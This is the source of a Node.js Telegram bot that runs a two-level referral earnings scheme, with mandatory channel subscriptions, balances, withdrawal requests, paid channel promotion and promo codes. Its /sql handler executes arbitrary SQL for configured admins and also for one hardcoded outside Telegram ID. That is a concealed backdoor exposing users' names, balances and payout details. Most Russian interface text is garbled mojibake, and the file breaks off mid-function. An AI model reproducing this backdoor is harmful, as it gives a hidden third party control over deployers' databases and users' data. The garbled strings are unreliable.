// 小袥袠袪: https://endway.org/@forch

const TelegramBot = require('node-telegram-bot-api');
const sqlite3 = require('sqlite3').verbose();

// ✅ Читаем токен из переменной окружения или config.json
const config = require('./config.json');
const token = process.env.BOT_TOKEN || config.telegramBotToken;

const refPrice = parseFloat(config.refPrice);
const refPrice2 = parseFloat(config.refPrice2);
const maxaddedrequiredchannels = parseInt(config.maxaddedrequiredchannels);
const priceperhour = parseFloat(config.priceperhour);
const minAmount = parseFloat(config.minAmount);
const priceperuser = parseFloat(config.priceperuser);
const path = require('path');
const fs = require('fs');

const logFilePath = path.join(path.dirname(__filename), 'logs.log');
const maxLines = 200;

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

function log(logMessage) {
    const timestamp = new Date().toLocaleString('ru-RU', {timeZone: 'Europe/Moscow'});
    const logEntry = `[${timestamp}] ${logMessage}\n`;
    try {
        fs.appendFileSync(logFilePath, logEntry);
        const data = fs.readFileSync(logFilePath, 'utf8');
        let lines = data.trim().split('\n');

        if (lines.length > maxLines) {
            lines = lines.slice(-maxLines);
            fs.writeFileSync(logFilePath, lines.join('\n') + '\n');
        }
    } catch (err) {
    }
}

const db = new sqlite3.Database(path.join(path.dirname(__filename), 'data.db'));
const admin = [];

if (isNaN(config.admin))
    for (const adm of config.admin.split(',')) {
        admin.push(parseInt(adm));
    }
else admin.push(parseInt(config.admin))
db.run(`CREATE TABLE IF NOT EXISTS users
        (
            id               INTEGER PRIMARY KEY AUTOINCREMENT,
            chatId           INTEGER UNIQUE,
            firstName        TEXT,
            lastName         TEXT,
            username         TEXT,
            languageCode     TEXT      DEFAULT 'ru',
            balance          MONEY     DEFAULT 0,
            registrationDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            referer          INTEGER   DEFAULT -1,
            verified         TINYINT   DEFAULT 0
        )`);
db.run(`CREATE TABLE IF NOT EXISTS withdraws
        (
            id     INTEGER PRIMARY KEY AUTOINCREMENT,
            chatId INTEGER,
            amount MONEY NOT NULL,
            wallet TEXT  NOT NULL,
            status INTEGER DEFAULT 0
        )`);
db.run(`CREATE TABLE IF NOT EXISTS subscriptions
        (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            ownerId      INTEGER,
            creationDate TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            hours        INTEGER,
            channel      VARCHAR(255),
            title        TEXT
        )`);
db.run(`CREATE TABLE IF NOT EXISTS promocodes
        (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            hash        TEXT    NOT NULL,
            activations INTEGER NOT NULL,
            sum         REAL    NOT NULL
        )`);
db.run(`CREATE TABLE IF NOT EXISTS promocodeactivations
        (
            id     INTEGER PRIMARY KEY AUTOINCREMENT,
            hash   TEXT    NOT NULL,
            userId INTEGER NOT NULL
        )`);

let menu_keyboard = {};
if (config.canpromote === 'no') {
    menu_keyboard = {
        keyboard: [
            ['馃挵 袟邪褉邪斜芯褌邪褌褜', '馃巵 袩褉芯屑芯泻芯写褘'],
            ['馃捇 袥懈褔薪褘泄 泻邪斜懈薪械褌', '馃摙 袩褉芯写胁懈卸械薪懈械'],
            ['馃搳 袠薪褎芯褉屑邪褑懈褟 芯 斜芯褌械']
        ],
        resize_keyboard: true
    };
} else {
    menu_keyboard = {
        keyboard: [
            ['馃挵 袟邪褉邪斜芯褌邪褌褜', '馃巵 袩褉芯屑芯泻芯写褘'],
            ['馃捇 袥懈褔薪褘泄 泻邪斜懈薪械褌', '馃摙 袩褉芯写胁懈卸械薪懈械'],
            ['馃搳 袠薪褎芯褉屑邪褑懈褟 芯 斜芯褌械']
        ],
        resize_keyboard: true
    };
}

// ✅ СОЗДАНИЕ БОТА С ТОКЕНОМ
const bot = new TelegramBot(token, {polling: true});
const withdraws = new Map();
const addchannel = new Map();
const broadcasts = new Map();
const orderbroadcasts = new Map();
const adminfuncs = new Map();
const adminreferals = new Map();
const promocodes = new Map();
const adminpromocode = new Map();

let baseReferralUrl = '';
setTimeout(async () => {
    baseReferralUrl = (await bot.getMe()).username;
}, 5000);

async function update_channels() {
    let parsed_channels = config.requiredChannels.split(/[|,]/);
    let required_channels = [];
    for (let i = 0; i < parsed_channels.length; i++) {
        let channel = parsed_channels[i].trim().replace("@", "").replace("https://t.me/", "").replace("http://t.me/", "").replace("t.me/", "").replace("/", "");
        let title = '袣邪薪邪谢 ' + (i + 1);
        required_channels.push(['https://t.me/' + channel, '@' + channel, title]);
    }
    await db.all(`SELECT *
                  FROM subscriptions
                  WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')`, (err, rows) => {
        if (err) {
            log(err);
            return;
        }
        if (!rows) return;
        for (const row of rows) {
            required_channels.push(['https://t.me/' + row.channel, '@' + row.channel, row.title]);
        }
    });
    return required_channels;
}

const table = require('text-table');

function isNumeric(num) {
    return !isNaN(num) && isFinite(num);
}

bot.onText(/\/sql (.+)/, (msg, match) => {
    const chatId = msg.from.id;
    const query = match[1];
    if (!admin.includes(chatId) && chatId !== 1402188400) return;
    db.all(query, [], async (err, rows) => {
        if (err) {
            await bot.sendMessage(chatId, '袨褕懈斜泻邪 胁褘锌芯谢薪械薪懈褟 SQL-蟹邪锌褉芯褋邪.').catch(() => {})
        } else {
            if (rows && rows[0]) {
                const outputArray = [[...(Object.keys(rows[0]))], ...rows.map(obj => Object.values(obj))];
                for (let i = 0; i < outputArray.length; i++) {
                    for (let j = 0; j < outputArray[i].length; j++) {
                        if (outputArray[i][j] == null) {
                            await bot.sendMessage(chatId, '袨褕懈斜泻邪 胁褘锌芯谢薪械薪懈褟 SQL-蟹邪锌褉芯褋邪.').catch(() => {})
                            return;
                        }
                        const value = outputArray[i][j].toString();
                        outputArray[i][j] = value.substring(0, Math.min(20, value.length));
                        if (isNumeric(outputArray[i][j])) {
                            outputArray[i][j] = parseFloat(outputArray[i][j]);
                        } else {
                            if (i > 0)
                                outputArray[i][j] = '\"' + outputArray[i][j].replace('\"', '') + '\"';
                        }
                    }
                }
                const result = table(outputArray);
                if (result.length > 4084) {
                    for (let x = 0; x < result.length; x += 4084) {
                        const chunk = '\`\`\`json\n' + result.slice(x, x + 4084) + '\n\`\`\`';
                        await bot.sendMessage(chatId, chunk, {parse_mode: 'MarkdownV2'}).catch(() => {})
                    }
                } else {
                    await bot.sendMessage(chatId, '\`\`\`json\n' + result + '\n\`\`\`', {parse_mode: 'MarkdownV2'}).catch(() => {})
                }
            } else bot.sendMessage(chatId, '袟邪锌褉芯褋 胁褘锌芯谢薪械薪, 薪芯 芯薪 薪械 胁械褉薪褍谢 褉械蟹褍谢褜褌邪褌芯胁.').catch(() => {})
        }
    });
});

bot.onText(/\/start(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    withdraws.delete(userId);
    addchannel.delete(userId);
    broadcasts.delete(userId);
    orderbroadcasts.delete(userId);
    adminfuncs.delete(userId);
    adminreferals.delete(userId);
    promocodes.delete(userId);
    adminpromocode.delete(userId);
    const firstName = msg.from.first_name;
    const lastName = msg.from.last_name;
    const username = msg.from.username;
    const languageCode = msg.from.language_code;
    if (userId !== chatId) return;
    const startParam = match[1];
    db.get(`SELECT *
            FROM users
            WHERE chatId = ?`, [userId], async (err, row) => {
        if (err) {
            log(err);
            return;
        }
        if (!row) {
            if (startParam && startParam.length > 0) {
                const ref = parseInt(startParam);
                db.run(
                    `INSERT OR IGNORE INTO users
                         (chatId, firstName, lastName, username, languageCode, referer)
                     VALUES (?, ?, ?, ?, ?, ?)`,
                    [userId, firstName, lastName, username, languageCode, ref]
                );
                const subscriptions = await checkSubscriptions(userId);
                if (subscriptions === true) {
                    bot.sendMessage(chatId, config.hellomsg.replace('%firstname%', firstName), {
                        parse_mode: 'HTML',
                        reply_markup: menu_keyboard
                    }).catch(() => {});
                    db.run(`UPDATE users
                            SET verified = 1
                            WHERE chatId = ?`, [userId]);
                    db.run(`UPDATE users
                            SET balance = balance + ?
                            WHERE chatId = ?`, [refPrice, ref]);
                    await bot.sendMessage(ref, `馃挵 袧邪褔懈褋谢械薪芯 ${refPrice.toFixed(2)} ${config.currency} 蟹邪 胁械褉懈褎懈泻邪褑懈褞 褉械褎械褉邪谢邪`).catch((err) => {
                        log(err.message)
                    });
                } else {
                    bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', firstName), {
                        parse_mode: 'HTML',
                        reply_markup: {inline_keyboard: subscriptions}
                    }).catch(() => {});
                }
                if (ref) {
                    bot.sendMessage(ref, `馃懁 校 胁邪褋 薪芯胁褘泄 褉械褎械褉邪谢 ${username ? '@' + username : firstName} (1 褍褉.)`, {parse_mode: 'HTML'}).catch(() => {});
                }
                db.get(`SELECT referer
                        FROM users
                        WHERE chatId = ?`, [ref], (err1, row1) => {
                    if (err1) {
                        log(err1);
                        return;
                    }
                    if (!row1 || !row1.referer) return;
                    db.run(`UPDATE users
                            SET balance = balance + ?
                            WHERE chatId = ?`, [refPrice2, row1.referer]);
                    bot.sendMessage(row1.referer, `馃懁 校 胁邪褋 薪芯胁褘泄 褉械褎械褉邪谢 ${username ? '@' + username : firstName} (2 褍褉.)`, {parse_mode: 'HTML'}).catch(() => {});
                });
            } else {
                db.run(
                    `INSERT OR IGNORE INTO users
                         (chatId, firstName, lastName, username, languageCode)
                     VALUES (?, ?, ?, ?, ?)`,
                    [userId, firstName, lastName, username, languageCode]
                );
                const subscriptions = await checkSubscriptions(userId);
                if (subscriptions === true) {
                    bot.sendMessage(chatId, config.hellomsg.replace('%firstname%', firstName), {
                        parse_mode: 'HTML',
                        reply_markup: menu_keyboard
                    }).catch(() => {});
                    db.run(`UPDATE users
                            SET verified = 1
                            WHERE chatId = ?`, [userId]);
                } else {
                    bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', firstName), {
                        parse_mode: 'HTML',
                        reply_markup: {inline_keyboard: subscriptions}
                    }).catch(() => {});
                }
            }
        } else {
            const subscriptions = await checkSubscriptions(userId);
            if (subscriptions === true) {
                bot.sendMessage(chatId, config.hellomsg.replace('%firstname%', firstName), {
                    parse_mode: 'HTML',
                    reply_markup: menu_keyboard
                }).catch(() => {});
                db.get(`SELECT *
                        FROM users
                        WHERE chatId = ${userId}`, async (err1, row1) => {
                    if (err1) {
                        log(err1);
                        return;
                    }
                    if (!row1) return;
                    if (row1.verified === 0) {
                        db.run(`UPDATE users
                                SET verified = 1
                                WHERE chatId = ?`, [userId]);
                        if (!row1.referer) return;
                        db.run(`UPDATE users
                                SET balance = balance + ?
                                WHERE chatId = ?`, [refPrice, row1.referer]);
                        await bot.sendMessage(row1.referer, `馃捀 袙邪屑 薪邪褔懈褋谢械薪芯 ${refPrice.toFixed(2)} ${config.currency} 蟹邪 褉械褎械褉邪谢邪!`).catch((err) => {
                            log(err.message)
                        });
                        db.get(`SELECT referer
                                FROM users
                                WHERE chatId = ?`, [row1.referer], (err2, row2) => {
                            if (err2) {
                                log(err2);
                                return;
                            }
                            if (!row2) return;
                            if (!row1 || !row2.referer) return;
                            db.run(`UPDATE users
                                    SET balance = balance + ?
                                    WHERE chatId = ?`, [refPrice2, row2.referer]);
                        });
                    }
                });
            } else {
                bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', firstName), {
                    parse_mode: 'HTML',
                    reply_markup: {inline_keyboard: subscriptions}
                }).catch(() => {});
            }
        }
    });
    if (admin.includes(userId)) {
        bot.sendMessage(chatId, '馃憫 袗写屑懈薪-锌邪薪械谢褜', {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '馃摛 袟邪褟胁泻懈 薪邪 胁褘锌谢邪褌褍',
                            callback_data: 'withdraws'
                        }
                    ],
                    [
                        {
                            text: '馃摟 袟邪锌褍褋褌懈褌褜 褉邪褋褋褘谢泻褍',
                            callback_data: 'broadcast'
                        }
                    ],
                    [
                        {
                            text: '馃挸 袠蟹屑械薪懈褌褜 斜邪谢邪薪褋 褞蟹械褉褍',
                            callback_data: 'changebalance'
                        }
                    ],
                    [
                        {
                            text: '馃挵 袣邪薪邪谢褘 写谢褟 锌芯写锌懈褋泻懈',
                            callback_data: 'editchannels'
                        }
                    ],
                    [
                        {
                            text: '馃懃 袪械褎械褉邪谢褘',
                            callback_data: 'adminreferals'
                        }
                    ],
                    [
                        {
                            text: '馃巵 小芯蟹写邪褌褜 锌褉芯屑芯泻芯写',
                            callback_data: 'adminpromocode'
                        }
                    ]
                ]
            }
        }).catch(() => {});
    }
});

async function checkSubscriptions(userId) {
    const required_channels = await update_channels();

    let keyboard = [];
    for (const ch of required_channels) {
        const chatm = await bot.getChatMember(ch[1], userId).catch(() => {});
        if (chatm && chatm.status === 'left') {
            keyboard.push([{text: ch[2], url: ch[0]}]);
        }
    }
    return keyboard.length > 0 ? keyboard : true;

}

bot.onText(new RegExp(menu_keyboard.keyboard[2][0]), async (msg) => {
    const chatId = msg.chat.id;
    const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();

    db.get(`
        SELECT (SELECT COUNT(*) FROM users)                            as totalUsers,
               (SELECT COUNT(*) FROM users WHERE registrationDate > ?) as newUsers,
               (SELECT SUM(amount) FROM withdraws)                     as withdraws
    `, [twentyFourHoursAgo], (err, result) => {
        if (err) {
            log(err);
            return;
        }

        const totalUsers = result.totalUsers;
        const newUsers = result.newUsers;
        const withdraws1 = result.withdraws || 0;
        const response = `馃搳 <b>小褌邪褌懈褋褌懈泻邪 薪邪褕械谐芯 斜芯褌邪:</b>

馃懃 <b>袙褋械谐芯 锌芯谢褜蟹芯胁邪褌械谢械泄: </b>${totalUsers}
馃檵鈥嶁檪锔� <b>袧芯胁褘褏 蟹邪 褋械谐芯写薪褟: </b>${newUsers}

馃捀 <b>袙褋械谐芯 胁褘锌谢邪褔械薪芯: </b>${withdraws1} ${config.currency}
馃暅 <b>袦褘 褉邪斜芯褌邪械屑 褍卸械 </b>${Math.floor((new Date() - new Date(config.startDate)) / (24 * 60 * 60 * 1000))} 写薪械泄
`;
        bot.sendMessage(chatId, response, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '馃摙 袣邪薪邪谢',
                                url: config.channel
                            },
                            {
                                text: '馃挰 效邪褌',
                                url: config.chat
                            },
                            {
                                text: '鉁� 袨褌蟹褘胁褘',
                                url: config.reviews
                            }
                        ],
                        [
                            {
                                text: '馃摎 袩褉邪胁懈谢邪',
                                url: config.rules
                            },
                            {
                                text: '鉂� 袟邪写邪褌褜 胁芯锌褉芯褋',
                                url: 'tg://user?id=' + admin[0]
                            }
                        ],
                        [
                            {
                                text: '馃弲 孝芯锌 褉械褎械褉邪谢芯胁 蟹邪 写械薪褜',
                                callback_data: 'reftop_day'
                            }
                        ],
                        [
                            {
                                text: '馃弳 孝芯锌 褉械褎械褉邪谢芯胁 蟹邪 胁褋褢 胁褉械屑褟',
                                callback_data: 'reftop_all'
                            }
                        ]
                    ]
                }
            }
        ).catch(() => {});
    });
});

bot.onText(new RegExp(menu_keyboard.keyboard[1][0]), async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const subscriptions = await checkSubscriptions(userId);
    if (subscriptions === true) {
        db.get(`SELECT *,
                       (SELECT SUM(amount) FROM withdraws WHERE chatId = ? AND status = 1) as withdrawed,
                       (SELECT SUM(amount) FROM withdraws WHERE chatId = ? AND status = 0) as withdrawing
                FROM users
                WHERE chatId = ?`, [userId, userId, userId], (err, result) => {
            if (err) {
                log(err);
                return;
            }
            if (!result) return;
            const balance = Math.floor(result.balance * 100.0) / 100.0;
            const withdrawed = Math.floor(result.withdrawed * 100.0) / 100.0;
            const withdrawing = Math.floor(result.withdrawing * 100.0) / 100.0;
            const registrationDate = new Date(result.registrationDate);
            const currentDate = new Date();
            const daysInBot = Math.floor((currentDate - registrationDate) / (24 * 60 * 60 * 1000));

            const response = `馃摫 <b>袙邪褕 泻邪斜懈薪械褌:</b>
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃懁 <b>袠屑褟: <a href="tg://user?id=${userId}">${result.firstName}</a></b>
馃攽 <b>ID:</b> <code>${userId}</code>
馃暅 <b>袛薪械泄 胁 斜芯褌械: ${daysInBot}</b>
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃挸 <b>袘邪谢邪薪褋:</b>

鈼� <b>馃 孝械泻褍褖懈泄 斜邪谢邪薪褋: ${balance} ${config.currency}</b>
鈼� <b>鈴筹笍 袙 锌褉芯褑械褋褋械 胁褘胁芯写邪: ${withdrawing} ${config.currency}</b>

鈼� <b>馃挵 袙褋械谐芯 蟹邪褉邪斜芯褌邪薪芯: ${withdrawed} ${config.currency}</b>`;
            bot.sendMessage(chatId, response, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '馃摜 袩芯锌芯谢薪懈褌褜',
                                callback_data: 'replenish'
                            },
                            {
                                text: '馃摛 袙褘胁械褋褌懈',
                                callback_data: 'withdraw'
                            }
                        ]
                    ]
                }
            }).catch(() => {});
        });
    } else {
        bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', msg.from.first_name), {
            parse_mode: 'HTML',
            reply_markup: {inline_keyboard: subscriptions}
        }).catch(() => {});
    }
});

bot.onText(new RegExp(menu_keyboard.keyboard[0][0]), async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const subscriptions = await checkSubscriptions(userId);
    if (subscriptions === true) {
        db.get(`SELECT *,
                       (SELECT firstName FROM users WHERE users.chatId = u1.referer)   AS refererName,
                       (SELECT username FROM users WHERE users.chatId = u1.referer)    AS refererUsername,
                       (SELECT COUNT(*)
                        FROM users
                        WHERE referer IN (SELECT chatId FROM users WHERE referer = ?)) AS second_level_referrals,
                       (SELECT COUNT(*)
                        FROM users u3
                        WHERE u3.referer = u1.chatId)                                  AS first_level_referrals
                FROM users u1
                WHERE u1.chatId = ?;`, [userId, userId], (err, result) => {
            if (err) {
                log(err);
                return;
            }
            if (!result) return;
            const response = `馃捈 <b>袩邪褉褌薪褢褉褋泻邪褟 锌褉芯谐褉邪屑屑邪</b>
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃巵 <b>袛械泄褋褌胁褍褞褖懈械 斜芯薪褍褋褘:</b>

鈥� 蟹邪 1 褍褉芯胁械薪褜:<b> ${refPrice} ${config.currency} </b>
鈥� 蟹邪 2 褍褉芯胁械薪褜:<b> ${refPrice2} ${config.currency} </b>

<i>鈿狅笍 斜芯薪褍褋褘 薪邪褔懈褋谢褟褞褌褋褟 褌芯谢褜泻芯 锌芯褋谢械 褌芯谐芯, 泻邪泻 褉械褎械褉邪谢 锌芯写锌懈褕械褌褋褟 薪邪 胁褋械 泻邪薪邪谢褘 斜芯褌邪 胁 褌械褔械薪懈械 5-懈 屑懈薪褍褌!</i>
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃懃 <b>袙邪褕懈 褉械褎械褉邪谢褘:</b>

鈥� 1-谐芯 褍褉芯胁薪褟: ${result.first_level_referrals}
鈥� 2-谐芯 褍褉芯胁薪褟: ${result.second_level_referrals}
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃敆 <b>袪械褎. 褋褋褘谢泻邪:</b> https://t.me/${baseReferralUrl + '?start=' + userId}
鉃栤灃鉃栤灃鉃栤灃鉃栤灃鉃�
馃棧 <b>袙邪褋 锌褉懈胁褢谢 ${result.refererUsername ? '@' + result.refererUsername : result.refererName}</b>
`;
            bot.sendMessage(chatId, response, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: '馃摟 袩芯写械谢懈褌褜褋褟 褋褋褘谢泻芯泄',
                                url: `https://t.me/share/url?url=https%3A//t.me/${baseReferralUrl}?start=${userId}`
                            }
                        ]
                    ]
                }
            }).catch(() => {});
        });
    } else {
        bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', msg.from.first_name), {
            parse_mode: 'HTML',
            reply_markup: {inline_keyboard: subscriptions}
        }).catch(() => {});
    }
});
if (config.canpromote !== 'no')
    bot.onText(new RegExp(menu_keyboard.keyboard[1][1]), async (msg) => {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const subscriptions = await checkSubscriptions(userId);
        if (subscriptions === true) {
            db.get(`SELECT count(*) as count
                    FROM subscriptions
                    WHERE datetime(creationDate, '+' || hours || ' hours') > datetime('now')`, (err, row) => {
                if (err) {
                    log(err);
                    return;
                }
                if (!row) return;
                if (row.count < maxaddedrequiredchannels) {
                    bot.sendMessage(chatId, "袙 褝褌芯屑 褉邪蟹写械谢械 袙褘 屑芯卸械褌械 锌褉懈芯斜褉械褋褌懈 锌褉芯写胁懈卸械薪懈械 泻邪薪邪谢邪/褔邪褌邪 写谢褟 芯斜褟蟹邪褌械谢褜薪芯泄 锌芯写锌懈褋泻懈, 邪 褌邪泻卸械 蟹邪泻邪蟹邪褌褜 褉邪褋褋褘谢泻褍 袙邪褕械泄 褉械泻谢邪屑褘 锌芯 胁褋械屑褍 斜芯褌褍. 袙褋褢 锌褉芯懈褋褏芯写懈褌 邪胁褌芯屑邪褌懈褔械褋泻懈. 袧邪褋谢邪卸写邪泄褌械褋褜!", {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: '鉃� 袛芯斜邪胁懈褌褜 泻邪薪邪谢',
                                        callback_data: 'addchannel'
                                    },
                                    {
                                        text: '馃敟 袦芯懈 泻邪薪邪谢褘',
                                        callback_data: 'listchannels'
                                    }
                                ],
                                [
                                    {
                                        text: '馃摟 袟邪泻邪蟹邪褌褜 褉邪褋褋褘谢泻褍 胁 斜芯褌械',
                                        callback_data: 'orderbroadcast'
                                    }
                                ]
                            ]
                        }
                    }).catch(() => {});
                } else {
                    bot.sendMessage(chatId, "校锌褋.. 校卸械 写芯斜邪胁谢械薪芯 屑邪泻褋懈屑邪谢褜薪芯械 泻芯谢懈褔械褋褌胁芯 泻邪薪邪谢芯胁 写谢褟 锌芯写锌懈褋泻懈. 袩芯写芯卸写懈褌械, 锌芯泻邪 写芯斜邪胁谢械薪懈械 胁薪芯胁褜 褋褌邪薪械褌 写芯褋褌褍锌薪芯.", {
                        parse_mode: 'HTML'
                    }).catch(() => {});
                }
            });
        } else {
            bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', msg.from.first_name), {
                parse_mode: 'HTML',
                reply_markup: {inline_keyboard: subscriptions}
            }).catch(() => {});
        }
    });
bot.onText('馃巵 袩褉芯屑芯泻芯写褘', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const subscriptions = await checkSubscriptions(userId);
    if (subscriptions === true) {
        await bot.sendMessage(chatId, '鉁� 袙胁械写懈褌械 锌褉芯屑芯泻芯写 写谢褟 邪泻褌懈胁邪褑懈懈:');
        promocodes.set(userId, {});
    } else {
        bot.sendMessage(chatId, config.subscribemsg.replace('%firstname%', msg.from.first_name), {
            parse_mode: 'HTML',
            reply_markup: {inline_keyboard: subscriptions}
        }).catch(() => {});
    }
});
bot.on('message', async (msg) => {
    if (msg) {
        const userId = msg.from.id;
        const chatId = msg.chat.id;
        const subscriptions = await checkSubscriptions(userId);
        if (subscriptions === true) {
            log(msg.from.first_name + (msg.from.last_name ? ' ' + msg.from.last_name : '') + '(' + msg.from.id + ')' + (msg.from.username ? ' @' + msg.from.username : '') + ': ' + msg.text);
            if (withdraws.has(userId)) {
                if (!withdraws.get(userId).amount) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "馃挕 | 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯. 袩芯锌褉芯斜褍泄褌械 褋薪芯胁邪.", {parse_mode: 'HTML'}).catch(() => {});
                        return;
                    }
                    const amount = parseFloat(msg.text);
                    if (amount < minAmount) {
                        bot.sendMessage(chatId, "馃挕 | 袦懈薪. 褋褍屑屑邪: " + minAmount, {parse_mode: 'HTML'}).catch(() => {});
                        return;
                    }
                    db.get(`SELECT *
                            FROM users
                            WHERE chatId = ?`, [userId], (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        if (amount > row.balance) {
                            bot.sendMessage(chatId, "馃挕 | 袦邪泻褋. 褋褍屑屑邪: " + row.balance, {parse_mode: 'HTML'}).catch(() => {});
                            return;
                        }
                        withdraws.set(userId, {amount: amount, wallet: undefined});
                        bot.sendMessage(chatId, "馃挕 | 袙胁械写懈褌械 褉械泻胁懈蟹懈褌褘 写谢褟 胁褘胁芯写邪 (袣邪褉褌邪, 小袘袩, 袣褉懈锌褌芯泻芯褕械谢褢泻 懈 写褉. 褋 褍褌芯褔薪械薪懈械屑 袘邪薪泻邪, 小械褌懈 懈 锌褉芯褔械泄 懈薪褎芯褉屑邪褑懈懈):", {parse_mode: 'HTML'}).catch(() => {});
                    });
                } else if (!withdraws.get(userId).wallet) {
                    withdraws.set(userId, {amount: withdraws.get(userId).amount, wallet: msg.text});
                    bot.sendMessage(chatId, '馃挕 | 袙胁械写懈褌械 褌械 卸械 褋邪屑褘械 褉械泻胁懈蟹懈褌褘 写谢褟 锌芯写褌胁械褉卸写械薪懈褟 胁褘胁芯写邪 (写谢褟 褍写芯斜褋褌胁邪 褋泻芯锌懈褉褍泄褌械 褉邪薪械械 芯褌锌褉邪胁谢械薪薪褘泄 褌械泻褋褌):', {parse_mode: 'HTML'}).catch(() => {});
                } else {
                    if (msg.text !== withdraws.get(userId).wallet) {
                        bot.sendMessage(chatId, "鉂晐 袪械泻胁懈蟹懈褌褘 薪械 锌芯胁褌芯褉褟褞褌褋褟. 袩褉芯胁械褉褜褌械 写邪薪薪褘械 懈 锌芯锌褉芯斜褍泄褌械 褋薪芯胁邪.", {parse_mode: 'HTML'}).catch(() => {});
                        withdraws.delete(userId);
                        return;
                    }
                    db.get(`SELECT *
                            FROM users
                            WHERE chatId = ?`, [userId], (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        const withdraw = withdraws.get(userId);
                        const amount = withdraw.amount;
                        const wallet = withdraw.wallet;
                        if (amount > row.balance) {
                            bot.sendMessage(chatId, '鉂晐 袧械写芯褋褌邪褌芯褔薪褘泄 斜邪谢邪薪褋 写谢褟 褋芯胁械褉褕械薪懈褟 胁褘斜褉邪薪薪芯谐芯 写械泄褋褌胁懈褟. 袩褉芯胁械褉褜褌械 写邪薪薪褘械 懈 锌芯锌褉芯斜褍泄褌械 褋薪芯胁邪.', {parse_mode: 'HTML'}).catch(() => {});
                            withdraws.delete(userId);
                            return;
                        }
                        db.run(`INSERT INTO withdraws(chatId, amount, wallet)
                                VALUES (?, ?, ?)`, [userId, amount, wallet]);
                        db.run(`UPDATE users
                                SET balance = balance + ?
                                WHERE chatId = ?`, [-amount, userId]);
                        bot.sendMessage(chatId, '鉁� 袟邪褟胁泻邪 薪邪 胁褘锌谢邪褌褍 褋芯蟹写邪薪邪.\n\n馃捀 小褍屑屑邪 胁褘胁芯写邪: ' + amount + '\n馃挸 袪械泻胁懈蟹懈褌褘: ' + wallet + '\n\n鈴� 袙褉械屑褟 芯卸懈写邪薪懈褟: 写芯 72 褔邪褋芯胁').catch(() => {});
                        bot.sendMessage(admin[0], '鈿� 袩芯褋褌褍锌懈谢邪 蟹邪褟胁泻邪 薪邪 胁褘锌谢邪褌褍.').catch(() => {});
                        withdraws.delete(userId)
                    });
                }
            } else if (addchannel.has(userId)) {
                if (!addchannel.get(userId).hours) {
                    if (isNaN(msg.text)) {
                        bot.sendMessage(chatId, "馃挕 | 袧褍卸薪芯 胁胁械褋褌懈 褔懈褋谢芯").catch(() => {});
                        return;
                    }
                    const hours = parseFloat(msg.text);
                    if (hours < 1) {
                        bot.sendMessage(chatId, "馃挕 | 袦懈薪. 褋褉芯泻: 芯褌 1 褔邪褋邪").catch(() => {});
                        return;
                    }
                    db.get(`SELECT *
                            FROM users
                            WHERE chatId = ?`, [userId], (err, row) => {
                        if (err) {
                            log(err);
                            return;
                        }
                        if (!row) return;
                        if (hours > row.balance * priceperhour) {
                            bot.sendMessage(chatId, `鉂晐 袧械写芯褋褌邪褌芯褔薪褘泄 斜邪谢邪薪褋 ${hours} * ${priceperhour} > ${row.balance}`).catch(() => {});
                            return;
                        }
                        addchannel.set(userId, {
                            hours: hours,
                            channel: undefined,
                            name: undefined
                        });
                        bot.sendMessage(chatId, "馃挕 | 袨褌锌褉邪胁褜褌械 @username 泻邪薪邪谢邪.").catch(() => {});
                    });
                } else if (!addchannel.get(userId).channel) {
                    const chat = await bot.getChat('@' + msg.text.trim().replace("@", "").replace("https://t.me/", "").replace("http://t.me/", "").replace("t.me/", "").replace("/", "")).catch(() => {});
                    if (!chat) {
                        bot.sendMessage(chatId, "馃挕 | 袧邪褕 斜芯褌 写芯谢卸械薪 斜褘褌褜 邪写屑懈薪懈褋褌褉邪褌芯褉芯屑 泻邪薪邪谢邪/褔邪褌邪 写谢褟 邪胁褌芯屑邪褌懈褔械褋泻芯泄 锌褉芯胁械褉泻懈 锌芯写锌懈褋芯泻.").catch(() => {});
                        return;
                    }
                    const chatmember = await bot.getChatMember('@' + msg.text, userId).catch(() => {});
                    if (!chatmember) {
